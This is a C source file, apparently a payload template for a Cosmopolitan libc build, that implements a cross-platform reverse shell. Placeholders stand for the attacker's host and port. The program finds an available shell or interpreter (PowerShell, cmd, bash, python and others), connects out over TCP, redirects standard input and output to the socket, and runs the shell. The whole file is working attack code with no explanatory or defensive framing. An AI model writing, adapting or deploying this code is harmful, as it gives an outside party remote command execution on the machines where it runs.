#include "libc/calls/calls.h"
#include "libc/dns/dns.h"
#include "libc/fmt/conv.h"
#include "libc/log/log.h"
#include "libc/macros.internal.h"
#include "libc/runtime/runtime.h"
#include "libc/sock/sock.h"
#include "libc/stdio/stdio.h"
#include "libc/str/str.h"
#include "libc/sysv/consts/af.h"
#include "libc/sysv/consts/ipproto.h"
#include "libc/sysv/consts/poll.h"
#include "libc/sysv/consts/shut.h"
#include "libc/sysv/consts/sock.h"
#include "libc/sysv/consts/so.h"
#include "libc/sysv/consts/sol.h"

#define REMOTE_ADDR "§LHOST§"
#define REMOTE_PORT "§LPORT§"

int main(int argc, char *argv[], char *envp[]) {
    char* interpreters[] = {
        "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\WINDOWS\\System32\\cmd.exe",
        "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash",
        "/bin/zsh", "/usr/bin/zsh", "/usr/local/bin/zsh",
        "/bin/dash", "/usr/bin/dash", "/usr/local/bin/dash",
        "/bin/ash", "/usr/bin/ash", "/usr/local/bin/ash",
        "/bin/fish", "/usr/bin/fish", "/usr/local/bin/fish",
        "/bin/sh", "/usr/bin/sh", "/usr/local/bin/sh",
        "/bin/ksh", "/usr/bin/ksh", "/usr/local/bin/ksh",
        "/bin/csh", "/usr/bin/csh", "/usr/local/bin/csh",
        "/bin/python", "/usr/bin/python", "/usr/local/bin/python",
        "/bin/ruby", "/usr/bin/ruby", "/usr/local/bin/ruby",
        "/bin/perl", "/usr/bin/perl", "/usr/local/bin/perl",
    };
    char* interpreter = NULL;
    const size_t size = sizeof(interpreters) / sizeof(interpreters[0]);
    struct stat buffer;
    for (size_t i = 0; i < size; i++) {
        if (stat(interpreters[i], &buffer) == 0) {
            interpreter = interpreters[i];
            break;
        }
    }
    if (interpreter == NULL) {
        return 1;
    }

    struct addrinfo *a = NULL;
    struct addrinfo h = {AI_NUMERICSERV, AF_INET, SOCK_STREAM, IPPROTO_TCP};
    int e = getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &h, &a);
    if (e < 0) {
        perror("getaddrinfo");
        return 1;
    }

    int s = socket(a->ai_family, a->ai_socktype, a->ai_protocol);
    if (s < 0) {
        perror("socket");
        return 1;
    }
    e = connect(s, a->ai_addr, a->ai_addrlen);
    if (e < 0) {
        perror("connect");
        return 1;
    }

    e = dup2(s, 0);
    if (e < 0) {
        perror("dup2");
        return 1;
    }
    e = dup2(s, 1);
    if (e < 0) {
        perror("dup2");
        return 1;
    }
    e = dup2(s, 2);
    if (e < 0) {
        perror("dup2");
        return 1;
    }

    char *args[] = { NULL, NULL };
    char **env = envp;
    e = execve(interpreter, args, env);
    if (e < 0) {
        perror("execve");
        return 1;
    }

    return 0;
}
